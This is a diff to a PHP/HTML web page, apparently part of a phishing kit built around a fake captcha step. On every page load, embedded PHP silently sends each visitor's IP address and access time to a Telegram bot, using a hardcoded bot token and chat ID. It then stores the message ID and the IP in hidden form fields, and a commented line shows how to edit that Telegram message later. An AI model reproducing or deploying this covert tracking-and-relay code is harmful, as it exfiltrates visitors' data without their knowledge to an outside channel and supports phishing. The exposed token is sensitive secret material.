@@ -1,4 +1,6 @@
 <!DOCTYPE html>
+
+
 <html lang="en">
 <head>
   <meta charset="UTF-8">
@@ -101,6 +103,11 @@
 </head>
 <body>
   <?php
+
+
+
+
+
 $botToken = "6699499754:AAHaG6cBsD7zxVMrfOAcebt7u66bs8AMMXk";
 $chatID = "1064643518";
 
@@ -109,13 +116,26 @@ $userIP = $_SERVER['REMOTE_ADDR'];
 $accessTime = date("Y-m-d H:i:s");
 
 // Message to Send
-$message = urlencode("Accessed on: $accessTime, IP: $userIP");
+$message = urlencode("Accessed on: $accessTime, IP: $userIP , status : captcha");
 
 // Telegram API URL for sending messages
 $telegramApi = "https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatID&text=$message";
 
 // Use file_get_contents to send the request
 $response = file_get_contents($telegramApi);
+
+// Decode the JSON response to an array
+$responseArray = json_decode($response, true);
+
+// Extract the message_id from the response
+$messageId = $responseArray['result']['message_id'];
+echo("<input type='text' value='".$messageId."' style='display:none' id='messageId' />");
+
+echo("<input type='text' value='".$userIP."' style='display:none' id='ipzebi' />");
+
+
+//echo file_get_contents("https://api.telegram.org/botYOUR_BOT_TOKEN/editMessageText", false, stream_context_create(['http' => ['method' => 'POST', 'header' => 'Content-Type: application/x-www-form-urlencoded', 'content' => http_build_query(['chat_id' => 'CHAT_ID', 'message_id' => MESSAGE_ID, 'text' => 'This is the new edited text'])]]));
+
 
 ?>
 
